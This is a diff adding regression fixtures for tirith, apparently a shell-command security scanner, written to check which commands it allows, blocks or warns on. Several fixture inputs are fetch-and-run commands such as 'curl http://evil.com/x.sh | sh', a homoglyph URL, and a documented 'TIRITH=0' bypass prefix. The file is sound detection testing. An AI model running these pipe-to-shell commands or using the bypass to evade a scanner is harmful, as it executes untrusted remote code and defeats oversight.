@@ -1,0 +1,114 @@
+# Curated regression fixtures for documented / reporter-reproduced behaviors.
+#
+# Every entry here represents a specific behavioral contract that tirith
+# either publishes (README.md, TIRITH.md, docs/) or committed to in response
+# to a closed user issue. Adding a row makes the contract machine-enforceable:
+# if a refactor breaks the documented behavior, this test fails.
+#
+# When adding an entry, include a comment pointing to the source note so
+# future readers know why the contract exists and can remove it if the
+# underlying doc changes.
+
+# README.md:539 / TIRITH.md:804 — `TIRITH=0 <cmd> | <interp>` is the published
+# whole-line bypass. This fixture exercises the interactive path that shell
+# hooks take, because non-interactive mode still rejects env bypass by default.
+
+[[fixture]]
+name = "documented_tirith_zero_pipe_bypass"
+min_milestone = 0
+input = "TIRITH=0 curl -L https://example.com | bash"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "documented_tirith_zero_pipe_bypass_multi_interp"
+min_milestone = 0
+input = "TIRITH=0 curl -sSL https://install.example.com | python3 -"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# Sequencing operators must NOT inherit the bypass. `TIRITH=0 ls && curl
+# http://evil | sh` should still fire plain_http_to_sink / curl_pipe_shell on
+# the second command.
+
+[[fixture]]
+name = "documented_tirith_zero_does_not_extend_to_and_and_chain"
+min_milestone = 0
+input = "TIRITH=0 ls && curl http://evil.com/x.sh | sh"
+context = "exec"
+shell = "posix"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink", "curl_pipe_shell"]
+
+# `scp <local> <host>:<path>` must not trip schemeless_to_sink.
+
+[[fixture]]
+name = "documented_scp_host_path_not_schemeless"
+min_milestone = 0
+input = "scp test.asdf testhost:/home/user/"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# The parser must also treat `user@host` with no colon as non-URL SSH syntax.
+
+[[fixture]]
+name = "documented_scp_user_at_host_not_schemeless"
+min_milestone = 0
+input = "scp user@server.com file.txt"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# `tirith diff <suspicious-url>` must not block on URL-derived Unicode rules
+# or on the separate exec-context byte scan. The inert-arg-range carveout
+# covers both arms. Cyrillic 'а' (U+0430) is inside the URL arg here.
+
+[[fixture]]
+name = "documented_tirith_diff_suppresses_url_rules"
+min_milestone = 0
+input = "tirith diff https://exаmple.com"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "documented_tirith_score_suppresses_byte_scan_rules"
+min_milestone = 0
+input = "tirith score https://exаmple.com"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# `tirith run` is still a sink and must keep firing URL rules. Adding `run`
+# to the inert list would break this fixture.
+
+[[fixture]]
+name = "documented_tirith_run_still_acts_as_sink"
+min_milestone = 0
+input = "tirith run http://evil.com/x.sh"
+context = "exec"
+shell = "posix"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+
+# Files with box-drawing characters near dynamic-code patterns must not panic.
+# This exec-context fixture verifies that multi-byte URL paths stay safe in the
+# main extractor path too.
+
+[[fixture]]
+name = "documented_multibyte_url_path_no_panic"
+min_milestone = 0
+input = "curl https://example.com/═══════"
+context = "exec"
+shell = "posix"
+expected_action = "warn"
+expected_rules = ["non_ascii_path"]
